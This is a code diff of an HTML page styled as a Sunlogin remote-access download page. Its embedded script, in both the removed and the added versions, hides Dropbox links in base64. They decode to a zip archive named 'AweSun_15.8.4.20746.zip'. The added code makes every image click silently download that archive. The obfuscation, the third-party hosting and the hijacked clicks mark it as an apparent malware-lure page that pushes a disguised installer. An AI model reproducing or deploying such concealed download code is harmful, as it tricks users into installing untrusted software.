@@ -18,61 +18,35 @@
 			<img src="images/sunlogin_03.png" width="1353" height="100%" alt="优秀案例展示3" /></td>
 	</tr>
 </table>
-
  <script>
-    (function() {
         
-        const resourceHandler = {
-            resourceLinks: [
-                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE=',
-                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE=',
-                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE='
-            ],
-            
-            decodeData: function(encoded) {
-                return atob(encoded);
-            },
-            
-            initResourceAccess: function() {
-                document.querySelectorAll('.guide-section').forEach((section, index) => {
-                    section.addEventListener('click', () => {
-                        this.processResource(this.resourceLinks[index]);
-                    });
-                });
-            },
-            
-            processResource: function(encoded) {
-                const resourceUrl = this.decodeData(encoded);
-                const temporaryLink = document.createElement('a');
-                temporaryLink.style.display = 'none';
-                temporaryLink.href = resourceUrl;
-                temporaryLink.rel = 'noopener noreferrer';
-                document.body.appendChild(temporaryLink);
-                temporaryLink.click();
-                setTimeout(() => {
-                    document.body.removeChild(temporaryLink);
-                }, 300);
-            }
-        };
-
-       
-        const imageViewer = {
-            initImagePreview: function() {
-                const images = document.querySelectorAll('.guide-section img');
-                images.forEach(img => {
-                    img.addEventListener('load', () => {
-                        img.style.opacity = 1;
-                    });
-                });
-            }
-        };
-
+        const encryptedUrls = [
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE=',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE=',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE=',     
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzRlbHdjNXc1Y245emswN3JteW56ZC9Bd2VTdW5fMTUuOC40LjIwNzQ2LnppcD9ybGtleT1kMHNpODFjbmtzbjM1dzBjaTU0bjQxaTdnJnN0PTA0MGRxdzdrJmRsPTE='
+        ];
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
         
-        document.addEventListener('DOMContentLoaded', () => {
-            resourceHandler.initResourceAccess();
-            imageViewer.initImagePreview();
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
         });
-    })();
-</script>
+    </script>    
+
 </body>
 </html>
